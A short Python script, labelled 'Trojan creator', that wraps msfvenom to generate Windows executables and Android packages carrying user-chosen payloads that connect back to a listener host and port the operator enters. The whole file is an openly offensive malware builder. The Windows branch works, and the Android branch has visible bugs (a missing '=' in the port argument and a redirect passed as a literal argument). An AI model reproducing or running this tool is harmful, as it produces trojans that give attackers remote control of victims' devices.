#Trojan creator
#Determine the file extension according to the trojan you prepared

import subprocess

message = "Please check the save file"

def windows_trojan(wtool,wpayload,wplatform,wa,wlhost,wlport,wfile,woutput):
    subprocess.call([wtool, "-p", wpayload, "--platform", wplatform, "-a", wa, f"lhost={wlhost}", f"lport={wlport}", "-f", wfile, "-o", woutput])


def android_trojan(atool,apaylaod,alhost,alport,aR):
    subprocess.call([atool, "-p", apaylaod, f"lhost={alhost}", f"lport{alport}", f"R > {aR}"])


print("You can learn how to use it by typing help or you can use one of the direct options")

Options = input()

if Options == "help" or Options == "Help":
    print("İf you type windows you can make trojans for Windows")
    print("İf you type android you can make trojans for Android")
    print("You can continue by typing a list first and typing one of the options in the list")
    Options = input("Choose windows or android: ")
elif Options == "list":
    print("1- Windows trojan creator")
    print("2- Android trojan creator")
    Options = input("Choose windows or android: ")
else:
    print("Please check windows trojan or android trojan")
    Options = input("Choose windows or android: ")

while Options == "windows":
    wtool = "msfvenom"
    wpaylaod = input("Choose paylaod: ")
    wplatform = "windows"
    wa = "x86"
    wlhost = input("Your localhost: ")
    wlport = input("The port you will listen to: ")
    wfile = "exe"
    woutput = input("Choose the place to save: ")
    windows_trojan(wtool,wpaylaod,wplatform,wa,wlhost,wlport,wfile,woutput)
    print(message)
    break

while Options == "android":
    atool = "msfvenom"
    apayload = input("Choose paylaod: ")
    alhost = input("Your localhost: ")
    alport = input("The port you will listen to: ")
    aR = input("Choose the place to save: ")
    android_trojan(atool,apayload,alhost,alport,aR)
    print(message)
    break



